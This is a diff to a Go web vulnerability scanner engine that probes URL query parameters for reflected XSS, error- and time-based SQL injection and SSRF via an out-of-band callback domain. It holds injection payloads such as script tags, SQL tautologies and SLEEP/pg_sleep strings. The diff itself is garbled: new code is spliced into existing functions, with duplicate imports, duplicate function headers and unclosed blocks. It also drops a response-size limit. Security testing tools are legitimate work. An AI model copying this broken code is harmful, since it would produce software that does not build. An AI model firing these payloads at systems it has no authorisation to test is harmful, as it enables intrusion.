@@ -11,6 +11,9 @@ import (
 	"net/http"
 	"net/url"
 	"sort"
+	"io"
+	"net/http"
+	"net/url"
 	"strings"
 	"time"
 
@@ -19,7 +22,6 @@ import (
 )
 
 const maxResponseBodyBytes = 2 * 1024 * 1024
-
 // Engine coordinates the execution of scanners and persistence.
 type Engine struct {
 	client *http.Client
@@ -89,7 +91,6 @@ func (e *Engine) Run(ctx context.Context, opts Options) error {
 	}()
 
 	e.logger.Info("scan started", logging.Fields{"scan_id": scanID, "target": opts.Target})
-
 	injectionPoints, err := e.enumerateInjectionPoints(ctx, scanID, parsed, opts)
 	if err != nil {
 		e.logger.Warn("parameter discovery failed", logging.Fields{"error": err})
@@ -100,6 +101,10 @@ func (e *Engine) Run(ctx context.Context, opts Options) error {
 
 	if opts.EnableXSS {
 		xssFindings, err := e.runXSS(ctx, scanID, injectionPoints, opts)
+	var findings []Finding
+
+	if opts.EnableXSS {
+		xssFindings, err := e.runXSS(ctx, scanID, parsed, opts)
 		if err != nil {
 			e.logger.Error("xss scanner failed", logging.Fields{"error": err})
 		}
@@ -108,6 +113,7 @@ func (e *Engine) Run(ctx context.Context, opts Options) error {
 
 	if opts.EnableSQLi {
 		sqliFindings, err := e.runSQLi(ctx, scanID, injectionPoints, opts)
+		sqliFindings, err := e.runSQLi(ctx, scanID, parsed, opts)
 		if err != nil {
 			e.logger.Error("sqli scanner failed", logging.Fields{"error": err})
 		}
@@ -116,6 +122,7 @@ func (e *Engine) Run(ctx context.Context, opts Options) error {
 
 	if opts.EnableSSRF && opts.OOBDomain != "" {
 		ssrfFindings, err := e.runSSRF(ctx, scanID, injectionPoints, opts)
+		ssrfFindings, err := e.runSSRF(ctx, scanID, parsed, opts)
 		if err != nil {
 			e.logger.Error("ssrf scanner failed", logging.Fields{"error": err})
 		}
@@ -134,6 +141,8 @@ func (e *Engine) Run(ctx context.Context, opts Options) error {
 
 func (e *Engine) runXSS(ctx context.Context, scanID int64, points []injectionPoint, opts Options) ([]Finding, error) {
 	e.logger.Info("running xss scanner", logging.Fields{"surface": len(points)})
+func (e *Engine) runXSS(ctx context.Context, scanID int64, target *url.URL, opts Options) ([]Finding, error) {
+	e.logger.Info("running xss scanner", logging.Fields{})
 	payloads := []string{
 		`<script>alert(1)</script>`,
 		`"><script>alert('huntsuite')</script>`,
@@ -168,6 +177,43 @@ func (e *Engine) runXSS(ctx context.Context, scanID int64, points []injectionPoi
 				e.logger.Warn("xss finding", logging.Fields{"parameter": point.Name, "source": point.Source})
 				findings = append(findings, finding)
 				if err := e.persistFinding(ctx, scanID, finding); err != nil {
+	baseParams := target.Query()
+	if len(baseParams) == 0 {
+		return nil, nil
+	}
+
+	var findings []Finding
+
+	for param := range baseParams {
+		for _, payload := range payloads {
+			mutated := cloneQuery(baseParams)
+			mutated.Set(param, payload)
+			mutatedURL := *target
+			mutatedURL.RawQuery = mutated.Encode()
+
+			finding, err := e.sendAndEvaluate(ctx, scanID, http.MethodGet, mutatedURL.String(), opts.UserAgent, func(body []byte) (bool, string) {
+				if bytes.Contains(body, []byte(payload)) {
+					return true, fmt.Sprintf("Payload reflected in response body for parameter '%s'", param)
+				}
+				return false, ""
+			})
+			if err != nil {
+				e.logger.Debug("xss request failed", logging.Fields{"parameter": param, "error": err})
+				continue
+			}
+			if finding != nil {
+				evidence := fmt.Sprintf("Parameter '%s' reflected payload %s", param, payload)
+				f := Finding{
+					Title:       fmt.Sprintf("Reflected XSS in %s", param),
+					Type:        "xss",
+					Severity:    SeverityHigh,
+					Description: "The application reflects input without proper sanitisation allowing script execution.",
+					Evidence:    evidence,
+					PoC:         fmt.Sprintf("curl '%s'", mutatedURL.String()),
+				}
+				e.logger.Warn("xss finding", logging.Fields{"parameter": param, "payload": payload})
+				findings = append(findings, f)
+				if err := e.persistFinding(ctx, scanID, f); err != nil {
 					e.logger.Warn("persist finding failed", logging.Fields{"error": err})
 				}
 				break
@@ -175,6 +221,11 @@ func (e *Engine) runXSS(ctx context.Context, scanID int64, points []injectionPoi
 			if idx < len(payloads)-1 {
 				if err := waitDelay(ctx, opts.Delay); err != nil {
 					return findings, err
+			if opts.Delay > 0 {
+				select {
+				case <-time.After(opts.Delay):
+				case <-ctx.Done():
+					return findings, ctx.Err()
 				}
 			}
 		}
@@ -193,6 +244,14 @@ func (e *Engine) runSQLi(ctx context.Context, scanID int64, points []injectionPo
 		{TruePayload: "' AND 1=1--", FalsePayload: "' AND 1=2--"},
 		{TruePayload: `" OR ""=""`, FalsePayload: `" OR ""="""`},
 	}
+func (e *Engine) runSQLi(ctx context.Context, scanID int64, target *url.URL, opts Options) ([]Finding, error) {
+	e.logger.Info("running sqli scanner", logging.Fields{})
+	baseParams := target.Query()
+	if len(baseParams) == 0 {
+		return nil, nil
+	}
+
+	errorPayloads := []string{"'", "\"", "' OR '1'='1"}
 	timePayloads := []struct {
 		Payload string
 		Delay   time.Duration
@@ -313,6 +372,88 @@ func (e *Engine) runSQLi(ctx context.Context, scanID int64, points []injectionPo
 				e.logger.Warn("sql injection finding", logging.Fields{"parameter": point.Name, "vector": "time", "source": point.Source, "latency_ms": resp.Latency.Milliseconds()})
 				findings = append(findings, finding)
 				if err := e.persistFinding(ctx, scanID, finding); err != nil {
+		{Payload: "1' AND SLEEP(5)--", Delay: 5 * time.Second},
+		{Payload: "1' AND pg_sleep(5)--", Delay: 5 * time.Second},
+	}
+
+	keywords := []string{"sql syntax", "mysql", "postgres", "near ", "syntax error"}
+
+	var findings []Finding
+
+	for param := range baseParams {
+		baseline, err := e.timeRequest(ctx, scanID, target, baseParams, param, baseParams.Get(param), opts)
+		if err != nil {
+			e.logger.Debug("baseline request failed", logging.Fields{"parameter": param, "error": err})
+			continue
+		}
+
+		for _, payload := range errorPayloads {
+			mutated := cloneQuery(baseParams)
+			mutated.Set(param, baseParams.Get(param)+payload)
+			mutatedURL := *target
+			mutatedURL.RawQuery = mutated.Encode()
+
+			finding, err := e.sendAndEvaluate(ctx, scanID, http.MethodGet, mutatedURL.String(), opts.UserAgent, func(body []byte) (bool, string) {
+				lower := strings.ToLower(string(body))
+				for _, kw := range keywords {
+					if strings.Contains(lower, kw) {
+						return true, fmt.Sprintf("SQL error keyword '%s' detected in response", kw)
+					}
+				}
+				return false, ""
+			})
+			if err != nil {
+				e.logger.Debug("error-based sqli request failed", logging.Fields{"parameter": param, "error": err})
+				continue
+			}
+			if finding != nil {
+				f := Finding{
+					Title:       fmt.Sprintf("Error-based SQL injection in %s", param),
+					Type:        "sqli",
+					Severity:    SeverityHigh,
+					Description: "The application exposes database error messages when crafted input is supplied.",
+					Evidence:    finding.Evidence,
+					PoC:         fmt.Sprintf("curl '%s'", mutatedURL.String()),
+				}
+				e.logger.Warn("sql injection finding", logging.Fields{"parameter": param, "vector": "error-based"})
+				findings = append(findings, f)
+				if err := e.persistFinding(ctx, scanID, f); err != nil {
+					e.logger.Warn("persist finding failed", logging.Fields{"error": err})
+				}
+				break
+			}
+		}
+
+		for _, payload := range timePayloads {
+			mutated := cloneQuery(baseParams)
+			mutated.Set(param, payload.Payload)
+			mutatedURL := *target
+			mutatedURL.RawQuery = mutated.Encode()
+
+			start := time.Now()
+			_, err := e.sendAndEvaluate(ctx, scanID, http.MethodGet, mutatedURL.String(), opts.UserAgent, func(body []byte) (bool, string) {
+				_ = body
+				return false, ""
+			})
+			duration := time.Since(start)
+
+			if err != nil {
+				e.logger.Debug("time-based request failed", logging.Fields{"parameter": param, "error": err})
+				continue
+			}
+			if duration-baseline > payload.Delay-2*time.Second {
+				evidence := fmt.Sprintf("Response delayed by %s when injecting %q", duration.Round(time.Millisecond), payload.Payload)
+				f := Finding{
+					Title:       fmt.Sprintf("Time-based SQL injection in %s", param),
+					Type:        "sqli",
+					Severity:    SeverityHigh,
+					Description: "Database time delays observed by injecting blocking expressions.",
+					Evidence:    evidence,
+					PoC:         fmt.Sprintf("curl '%s'", mutatedURL.String()),
+				}
+				e.logger.Warn("sql injection finding", logging.Fields{"parameter": param, "vector": "time-based", "duration": duration})
+				findings = append(findings, f)
+				if err := e.persistFinding(ctx, scanID, f); err != nil {
 					e.logger.Warn("persist finding failed", logging.Fields{"error": err})
 				}
 				break
@@ -329,11 +470,15 @@ func (e *Engine) runSQLi(ctx context.Context, scanID int64, points []injectionPo
 func (e *Engine) runSSRF(ctx context.Context, scanID int64, points []injectionPoint, opts Options) ([]Finding, error) {
 	e.logger.Info("running ssrf scanner", logging.Fields{"surface": len(points)})
 	if opts.OOBDomain == "" {
+func (e *Engine) runSSRF(ctx context.Context, scanID int64, target *url.URL, opts Options) ([]Finding, error) {
+	e.logger.Info("running ssrf scanner", logging.Fields{})
+	baseParams := target.Query()
+	if len(baseParams) == 0 {
 		return nil, nil
 	}
 
 	var findings []Finding
-
+  
 	for _, point := range points {
 		if err := ctx.Err(); err != nil {
 			return findings, err
@@ -381,10 +526,40 @@ func (e *Engine) runSSRF(ctx context.Context, scanID int64, points []injectionPo
 		if err := e.persistFinding(ctx, scanID, finding); err != nil {
 			e.logger.Warn("persist finding failed", logging.Fields{"error": err})
 		}
+	for param := range baseParams {
+		mutated := cloneQuery(baseParams)
+		mutated.Set(param, fmt.Sprintf("http://%s", opts.OOBDomain))
+		mutatedURL := *target
+		mutatedURL.RawQuery = mutated.Encode()
+
+		_, err := e.sendAndEvaluate(ctx, scanID, http.MethodGet, mutatedURL.String(), opts.UserAgent, func(body []byte) (bool, string) {
+			_ = body
+			return false, ""
+		})
+		if err != nil {
+			e.logger.Debug("ssrf request failed", logging.Fields{"parameter": param, "error": err})
+			continue
+		}
+
+		evidence := fmt.Sprintf("Injected callback domain %s into parameter %s", opts.OOBDomain, param)
+		f := Finding{
+			Title:       fmt.Sprintf("Potential SSRF in %s", param),
+			Type:        "ssrf",
+			Severity:    SeverityMedium,
+			Description: "The parameter accepts arbitrary URLs. Monitor the OOB domain for interactions to confirm exploitation.",
+			Evidence:    evidence,
+			PoC:         fmt.Sprintf("curl '%s'", mutatedURL.String()),
+		}
+		e.logger.Info("potential ssrf discovered", logging.Fields{"parameter": param, "oob_domain": opts.OOBDomain})
+		if err := e.persistFinding(ctx, scanID, f); err != nil {
+			e.logger.Warn("persist finding failed", logging.Fields{"error": err})
+		}
+		findings = append(findings, f)
 	}
 
 	return findings, nil
 }
+
 
 type parameterLocation int
 
@@ -588,6 +763,16 @@ func (e *Engine) execute(ctx context.Context, scanID int64, template requestTemp
 	}
 
 	reqID, err := e.store.RecordRequest(ctx, scanID, req.Method, req.URL.String(), headerJSON(req.Header), template.Body)
+func (e *Engine) sendAndEvaluate(ctx context.Context, scanID int64, method, targetURL, userAgent string, evaluator func([]byte) (bool, string)) (*evaluationResult, error) {
+	req, err := http.NewRequestWithContext(ctx, method, targetURL, nil)
+	if err != nil {
+		return nil, err
+	}
+	if userAgent != "" {
+		req.Header.Set("User-Agent", userAgent)
+	}
+
+	reqID, err := e.store.RecordRequest(ctx, scanID, method, targetURL, headerJSON(req.Header), nil)
 	if err != nil {
 		e.logger.Debug("failed to persist request", logging.Fields{"error": err})
 	}
@@ -599,8 +784,9 @@ func (e *Engine) execute(ctx context.Context, scanID int64, template requestTemp
 		return nil, err
 	}
 	defer resp.Body.Close()
-
+  
 	body, err := io.ReadAll(io.LimitReader(resp.Body, maxResponseBodyBytes))
+	body, err := io.ReadAll(resp.Body)
 	if err != nil {
 		return nil, err
 	}
@@ -610,7 +796,7 @@ func (e *Engine) execute(ctx context.Context, scanID int64, template requestTemp
 			e.logger.Debug("failed to persist response", logging.Fields{"error": err})
 		}
 	}
-
+  
 	return &responsePayload{
 		StatusCode: resp.StatusCode,
 		Headers:    cloneHeader(resp.Header),
@@ -640,6 +826,11 @@ func (e *Engine) measureLatency(ctx context.Context, scanID int64, template requ
 		return 0, fmt.Errorf("no samples recorded")
 	}
 	return total / time.Duration(count), nil
+	matched, evidence := evaluator(body)
+	if matched {
+		return &evaluationResult{Evidence: evidence}, nil
+	}
+	return nil, nil
 }
 
 func (e *Engine) persistFinding(ctx context.Context, scanID int64, finding Finding) error {
@@ -671,7 +862,6 @@ func (e *Engine) persistFinding(ctx context.Context, scanID int64, finding Findi
 	})
 	return err
 }
-
 func detectXSS(resp *responsePayload, payload string) (bool, string) {
 	if resp == nil {
 		return false, ""
@@ -794,6 +984,21 @@ func escapeShellArg(arg string) string {
 }
 
 func cloneValues(q url.Values) url.Values {
+func (e *Engine) timeRequest(ctx context.Context, scanID int64, target *url.URL, params url.Values, param, value string, opts Options) (time.Duration, error) {
+	mutated := cloneQuery(params)
+	mutated.Set(param, value)
+	mutatedURL := *target
+	mutatedURL.RawQuery = mutated.Encode()
+
+	start := time.Now()
+	_, err := e.sendAndEvaluate(ctx, scanID, http.MethodGet, mutatedURL.String(), opts.UserAgent, func(body []byte) (bool, string) {
+		_ = body
+		return false, ""
+	})
+	return time.Since(start), err
+}
+
+func cloneQuery(q url.Values) url.Values {
 	cloned := make(url.Values, len(q))
 	for k, v := range q {
 		cp := make([]string, len(v))
@@ -802,7 +1007,6 @@ func cloneValues(q url.Values) url.Values {
 	}
 	return cloned
 }
-
 func cloneURL(u *url.URL) *url.URL {
 	if u == nil {
 		return nil
@@ -832,6 +1036,7 @@ func headerJSON(h http.Header) string {
 	if h == nil {
 		return "{}"
 	}
+func headerJSON(h http.Header) string {
 	buf, _ := json.Marshal(h)
 	return string(buf)
 }
